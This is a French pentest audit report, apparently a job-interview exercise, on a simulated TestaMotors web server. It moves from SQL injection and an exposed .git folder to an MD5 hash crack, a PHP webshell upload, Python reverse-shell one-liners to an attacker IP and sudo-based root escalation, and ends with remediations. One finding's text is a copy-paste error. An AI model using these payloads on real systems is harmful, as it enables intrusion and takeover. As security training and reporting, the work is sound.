# Rapport d'Audit

## A l'attention de TestaMotors

![Alt text](img/logo.png "logo OCD")

Auteur : **Hallez Arthur**

Contact : **arthur.hallez.59930@gmail.com**

Version : 2.0

Fait le **07/06/2024**

## Table des Matières

1. [Introduction](#introduction)
2. [Objectifs de l'Audit](#objectifs-de-laudit)
3. [Méthodologie](#méthodologie)
4. [Résumé Exécutif](#résumé-exécutif)
    - [Vulnérabilités Critiques](#vulnérabilités-critiques)
        - [Injection SQL](#injection-sql)
        - [Répertoires Sensibles Exposés](#répertoires-sensibles-exposés)
        - [Xdebug PHP](#xdebug)
        - [Formulaire d'upload permissif](#upload-permissif)
        - [Binaire executer avec les droits root](#binaire)
    - [Vulnérabilités Moyennes](#vulnérabilités-moyennes)
        - [Algorithmes de Hachage Dépassés](#algorithmes-de-hachage-dépassés)
    - [Vulnérabilités Faibles](#vulnérabilités-faibles)
        - [Configuration PHP Exposée](#configuration-php-exposée)
5. [Conclusion](#conclusion)
6. [Annexes](#annexes)
    - [Logs et Scripts Utilisés](#logs-et-scripts-utilisés)

<div style="page-break-after: always; visibility: hidden"> 
\pagebreak 
</div>

## Introduction

Cet audit de pentest a été réalisé dans le cadre d'un entretien d'embauche pour le poste d'alternant pentesteur chez Orange Cyber Defense. L'objectif principal est de démontrer mes compétences en matière de sécurité informatique et d'évaluation des vulnérabilités. Cet audit est une simulation pratique visant à identifier et évaluer les vulnérabilités au sein d'une infrastructure prédéfinie. Les résultats obtenus permettront de mettre en évidence mes capacités à mener des tests de pénétration et à fournir des recommandations de sécurité pertinentes.

## Objectifs de l'Audit

- Identifier et évaluer les vulnérabilités de sécurité présentes dans l'infrastructure.
- Fournir des recommandations pour remédier aux vulnérabilités identifiées.

## Résumé Rapide

3. [**Exploitation des Vulnérabilités SQL :**](#exploitation-des-vulnérabilités-sql)
    - Découverte d'une injection SQL sur le paramètre `id` des pages admin.
    - Utilisation de `SQLmap` pour verifier l'exploitation de l'injection SQL.

1. [**Scan Nmap**](#reconnaissance-active)
    - Utilisation de `Nmap` pour obtenir des informations sur les services actifs.
    - Port 80 (HTTP), 8080(HTTP) et 22 (SSH) ouverts.

2. [**Énumération de Répertoires :**](#énumération-de-répertoire)
    - Utilisation de `Gobuster` pour découvrir des répertoires cachés comme `/.git/`, `/admin/`.

4. [**Accès aux code source de l'application :**](#accès-dossier-sensible)
    - Récupération du dossier `.git` contenant des informations sensibles notamment le code source de l'application ainsi que des fichier SQL contenant des secrets.

5. [**Cassage des Mots de Passe :**](#cassage-de-mot-de-passe)
    - Extraction et craquage du hachage MD5 du mot de passe de l'utilisateur 'admin' par le biais de `John the Ripper`.

5. [**Upload de fichier malicieux :**](#upload)
    - dû a plusieurs manque de verification il a été possible d'upload des fichiers de type .php étant interpreter par le serveur.

5. [**Execution de commande a distance :**](#rce)
    - Par le biais d'un webshell, nous avons pu executer des commandes sur le serveur distant afin d'en prendre le controle.

6. [**Accès SSH :**](#récupération-du-dossier-sur-ma-machine)
    - Utilisation des clés SSH trouvées pour accéder au serveur via SSH.
    - Accès réussi avec les identifiants craqués.

7. [**Escalade de Privilèges :**](#passage-super-utilisateur)
    - Utilisation de `linPEAS` pour identifier les escalade de privilèges.
    - Exploitation des permissions `sudo` pour obtenir un accès root.

<div style="page-break-after: always; visibility: hidden"> 
\pagebreak 
</div>

## Méthodologie

### Scénario d'Exploitation

#### Compromission de la Machine 35.180.243.34

##### Reconnaissance Active

Nous avons commencé par un scan `Nmap` sur l'IP 35.180.243.34. Celui-ci nous a permis de constater que les ports 80 (Web HTTP), 8080 (Web HTTP) et 22 (SSH) étaient ouverts. grace aux script d'enumeration de nmap (option `-sC`) nous avons pu découvrir un dossier nommée `.git` à la racine de l'application.

![Alt text](img/namp.png "Scan nmap")

##### Énumération de Répertoire

Nous avons donc en parallèle lancé une énumération de dossiers sur le serveur web avec l'outil `gobuster` via la commande suivante : `gobuster dir -w `fzf-wordlists` -u http://35.180.243.34/`.

![Alt text](img/dirb.png "gobuster")

Nous avons également lancé un scan `nuclei` qui nous a permis de voir une potentielle injection SQL ainsi que la fonctionnalité xdebug .

![Alt text](img/neclei_rapport.png "nuclei")

Nous avons alors utilisé SQLmap pour avoir la preuve que celle-ci était bien présente.

##### Exploitation des Vulnérabilités SQL

Le résultat de nuclei nous indiquant une injection sql nous avons tenter de la verifier par le biais de SQlmap

`sqlmap -u 'http://35.180.243.34/admin/view_car.php?id=-1'`

![Alt text](img/injectionSql.png "sqlmap")


##### Accès Dossier Sensible

Afin de confirmer la présente d'un dossier `.git`. Nous avons donc utilisé l'outil `git-dumper` disponible à [l'url suivante ](https://github.com/arthaud/git-dumper) :  afin de récupérer le contenu sur notre poste et ainsi parcourir le code source du site internet obtenus.

![Alt text](img/fetch.git.png ".git")

En regardant dans le code source de la page web, nous nous sommes apercu qu'un fichier .sql contenait le hash de l'utilisateur nommé 'admin'.

![Alt text](img/loginAdm.png "Hash de mot de passe")


##### Craquage de Mot de Passe

Après avoir récupéré ces informations, nous pouvons lancer l'outil `John the Ripper` pour essayer de brute force le mot de passe.

Cependant, le hash étant assez commun, nous avions besoin de trouver le format de celui-ci afin de tenter une attaque par dictionnaire.

C'est pour cela que nous avons parcouru le code source à la recherche de l'algorithme utilisé, en l'occurence le MD5 : 

![Alt text](img/hashtypePassword.png "Type Hash")

Une fois toute les informations en notre possession nous avons pu très rapidement obtenir le mot de passe de l'utilisateur en utilisant la commande suivante : 

`john hashAdmin.txt --format=Raw-MD5`

![Alt text](img/mdpAdmin.png "Mdp admin")

##### Connexion Administrateur sur le Site Web

Une fois le mot de passe récupéré, nous pouvons nous connecter en tant qu'administrateur sur l'interface web.

![Alt text](img/AccéeAdmin.png "connexion admin")

En regardant les pages accessibles sur le site, nous avons rapidement aperçu dans "system setting" la possibilité d'uploads de fichiers.

Nous avons donc essayé d'uploader un fichier .php qui contenait uniquement la fonction `phpinfo()`. Cette fonction permet à l'origine de voir les informations de configuration php. Dans notre cas, elle nous permet de vérifier que notre fichier envoyé est bien interprété par le serveur.

Une fois cela vérifié, nous devons trouver le chemin vers le fichier uploadé sur le site. Dans l'onglet Cars, nous pouvons voir apparaître l'image d'une voiture.

 Nous avons donc copié l'URL de l'image et remplacé le nom de l'image par le nom de notre fichier.

 Cependant nous nous obtenus une erreur 404. Après analyse du code source nous avons decelé une fonction nommée `save_settings()` détaillant la logique lié a l'upload

 ![Alt text](img/2024-06-08_08-12.png "Horodatage fichier")


Après avoir compris que le fichier était horodaté nous avons tenter d'acceder de nouveau a notre fichier : 

![Alt text](img/AccèesInfo.php.png "Vérification interprétation")

Cette fois ci le phpinfo est bien trouvé et executer par le serveur.

##### Exploitation des Uploads de Fichier

Après avoir effectué cette vérification, nous pouvons injecter un fichier `php` malveillant qui nous permet d'envoyer des commandes au serveur.

Nous avons commencé par vérifier la présence d'utilitaires me permettant d'avoir un reverse shell. Nous avons aperçu grâce à la commande `which` que l'utilitaire python3 était sur le serveur. Nous avons alors utilisé le payload suivant pour initier notre reverse shell.

`export RHOST="172.32.1.218";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")`

et la commande suivante pour créer un serveur d'ecoute sur la machine nommé `ip-172-32-1-218`: `nc -lvnp 1234`

![Alt text](img/RCE.png "RCE")

##### Récupération d'une Connexion Utilisateur

Une fois le reverse shell obtenus en tant que www-data, nous avons lancé le script `linpeas` qui permet de faire ressortir les potentielles failles d'escalade de privilèges.

![Alt text](img/linpeas.png "linpeas www-data")

Celui-ci nous a permis de découvrir un dossier compressé intéressant dans le repertoire principale de l'utilisateur testa. Ce dossier est `/home/testa/.ssh-backup.tar.gz`.

![Alt text](img/2024-06-08_08-37.png "Dossier Compressé")

##### Récupération du Dossier sur ma Machine

Pour voir son contenu, nous avons dû le télécharger car nous n'avions pas les droits nécessaires pour le décompresser.

![Alt text](img/fichier.png "Dossier local")

Une fois en local, nous avons pu voir son contenu par le biais des commande suivantes

```
gzip -d ssh-backup.tar.gz
tar xvf ssh-backup.tar
```
 
 Nous avons trouvé la clé RSA de l'utilisateur testa, ce qui nous a permis de nous connecter en ssh sur le serveur : 

![Alt text](img/ssh.png "connexion ssh")

##### Passage Super Utilisateur

Une fois connectés avec l'utilisateur testa, nous avons relancé le script `linpeas`. Celui-ci nous a remonté plusieurs informations intéressantes.

Pour commencer, celui-ci nous récuperer une liste de CVE lié a de l'exploitation kernal.

[Alt text](img/linpeasuser.png "CVE linpeas")

Linpeas nous a également obtenus une information importante concernant un binaire nommé `install` disponible dans le chemin `/usr/bin/`. En effet ce binaire a la possibilité d'etre executer avec les privileges superutilisateur sur la machine.

![Alt text](img/pistesudo.png "Linpeas binaire mal conf")

Pour l'exploiter, il nous faut créer un fichier contenant un script exécutant un reverse shell.
![Alt text](img/Root.png "Requête Post")

Nous devons ensuite utiliser le binaire install

```
LFILE=file_to_change
TF=$(mktemp)
sudo install -m 6777 $LFILE $TF
```

![Alt text](img/ygegqfd.png "Exploitation")

#### Piste non exploré

le scan `nuclei` Nous montre la présence du xdebug, cette piste aurait également pu nous mener a l'obtention d'un shell sur la victime.

![Alt text](img/2024-06-08_10-01.png "Nuclei xdebug")

### Outils et Techniques Utilisés

- **Nmap** : Pour scanner les ports et services ouverts.
- **Burp Suite** : Pour analyser les applications web.
- **Gobuster** : Pour découvrir des répertoires et fichiers cachés.
- **Nuclei** : Pour decouvrir des potentielle faille sur l'application web
- **SQLmap** : Pour détecter et exploiter les injections SQL.
- **John the Ripper** : Pour craquer les mots de passe hachés.
- **SSH** : Pour accéder au serveur.
- **LinPEAS** : Pour identifier des escalade de privilèges.

---

<div style="page-break-after: always; visibility: hidden"> 
\pagebreak 
</div>

## Résumé Exécutif

Cet audit a permis de découvrir plusieurs vulnérabilités critiques au sein de l'infrastructure Testa Motors. Les découvertes incluent :

| Critique  | Moyenne  | Faible  |
|---|---|---|
| - Injection SQL  |-| - Hachage MD5 des mots de passe  |
| - Exposition du dossier github | - | - Configuration PHP exposée  |
|- Binaire mal configuré|- |- |
|- Session Xdebug|- |- |

Recommandation clefs

## Résultats Détaillés

### Vulnérabilités Critiques

#### Injection SQL

**Description :** Nous avons trouvé une injection SQL sur le paramètre `id` des pages admin.

**Preuve :**
![Alt text](img/injectionSql.png "Champ SQLI + injection")

**Remédiation :**
Pour éviter les injections SQL il y a plusieurs techniques complémentaires.
Chacune des méthodes employées renforcera la sécurité de votre application.
Voici la liste des points à vérifier :

- les informations entrées par l'utilisateur doivent toujours être vérifiées. C'est valable pour tous types d'applications et de vulnérabilités. En PHP par exemple, l'utilisation de la fonction « mysqli_real_escape_string() » est incontournable.
- utiliser les procédures stockées : ce sont des routines effectuant toujours les mêmes actions. Elles constituent une aide pour lutter contre les injections SQL en plus du gain de performance apporté
- requêtes préparées : la requête sera analysée, compilée et optimisée avant d'insérer les paramètres. Elles apportent souvent un gain de performance aussi. C'est également incontournable
- expressions régulières : ça peut être utile de filtrer les informations entrées par l'utilisateur. Par exemple, si y a les mots clés « union, select » on renvoie vers une page par défaut (erreur ou autre)
- gérer les droits de connexion à la base de donnée : mettre uniquement les droits nécessaires, voir même créer plusieurs profils en fonction des besoins
- les messages d'erreur : il est important de ne jamais afficher les messages d'erreurs sur l'environnement de production. Il vaut mieux les loggers dans des fichiers
- droits des fichiers : il faut vérifier les droits des fichiers de l'application, pour éviter qu'il ne soit possible de les lire à l'aide d'une injection SQL
- logs : en cas d'attaque, les fichiers de logs (serveur et applicatif) constituent votre meilleurs allié pour trouver rapidement le point d'injection et prendre les mesures adéquates. Il est évident qu'il faut les sauvegarder régulièrement (par exemple tous les jours) pour être sûr qu'ils ne soient pas effacés
- accès au serveur de base de donnée : vérifiez également les applications qui accèdent à la base de donnée et leurs sécurités respectives (exemple : PhpMyAdmin, accès au serveur de base de donnée depuis l'extérieur, etc...)
- contrôle plus haut niveau : il est possible de faire des vérifications à plus haut niveau. Par exemple, il est possible d'utiliser « Apache mod_security », ou encore un IDS comme « snort »
- séparer les environnements : si possible, il est conseillé de séparer la machine hébergeant la base de donnée de la machine hébergeant le site web. C'est plus facile à maintenir, à superviser et si la machine du site web est piratée, celle de la base de donnée ne l'est pas


#### Exposition de l'Historique du Code Source

**Description :** Le dossier `.git` accèssible sur le site en production. Cela permet a un utilisateur de recupérer toutes les modification effectuer sur le site web.

**Preuve :**
![Alt text](img/2024-06-07_19-07.png "Screen des secrets")

**Remédiation :** Ne pas déployer le dossier `.git` dans les fichiers accessibles en production.


#### Session Xdebug

**Description :** Une session Xdebug est ouverte sur le serveur. Il est possible pour un utilisateur de récupérer un reverse shell.

**Preuve :**
![Screen des secrets](img/2024-06-08_10-01.png "Screen des secrets")

**Remédiation :**
Désactivation de Xdebug en production, verifiez la configuration du fichier `php.ini`

#### Upload de fichier permisif

**Description :** Une session Xdebug est ouverte sur le serveur. Il est possible pour un utilisateur de récupérer un reverse shell.

**Preuve :**
![Screen des secrets](img/2024-06-08_10-01.png "Screen des secrets")

**Remédiation :**
Désactivation de Xdebug en production, verifiez la configuration du fichier `php.ini`

### Vulnérabilités Moyennes

#### Hachage MD5 des Mots de Passe

**Description :** Les mots de passe des utilisateurs sont stockés en utilisant l'algorithme de hachage MD5. 

**Preuve :**
![Alt text](img/mdpAdmin.png "Hachage MD5")

**Remédiation :** Remplacer MD5 par des algorithmes plus robustes comme bcrypt ou Argon2.

### Vulnérabilités Faibles

#### Configuration PHP Exposée

**Description :** L'accès à `info.php` a exposé des informations détaillées sur la configuration PHP (version PHP 7.4.30).

**Preuve :**
![Alt text](img/phpinfoOriginal.png "Configuration PHP exposée")

**Remédiation :** Désactiver les pages de divulgation d'informations PHP.

## Conclusion

Cet audit a révélé plusieurs vulnérabilités critiques et moyennes dans l'application Testa Motors. Les principales recommandations incluent la mise en œuvre de meilleures pratiques de sécurité pour les requêtes SQL, la protection des répertoires sensibles et la mise à jour des algorithmes de hachage des mots de passe. En suivant ces recommandations, Testa Motors peut améliorer significativement sa posture de sécurité et protéger ses données sensibles.

## Annexes

### Logs et Scripts Utilisés

**Exemple de Log Nmap :**

![Alt text](img/namp.png "Configuration PHP exposée")

**Payload PHP**

Le code malveillant dans le fichier php

`
<?php echo "Shell";system($_GET['cmd']); ?>
`

**Reverse Shell**

La commande pour récupérer mon reverse shell avec python3

`
export RHOST="172.17.0.1";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
`

**Exemple de Script pour Craquer un Mot de Passe :**

`
john hashAdmin.txt --format=Raw-MD5
`
![Alt text](img/mdpAdmin.png "Configuration PHP exposée")

**Création Serveur Web Python3**

Commande pour monter un serveur web avec python3

`
python3 -m http.server 9090
`

---

En suivant ces recommandations, Testa Motors peut considérablement améliorer sa posture de sécurité et se protéger contre les menaces potentielles. Pour toute question ou besoin de clarification, n'hésitez pas à me contacter.
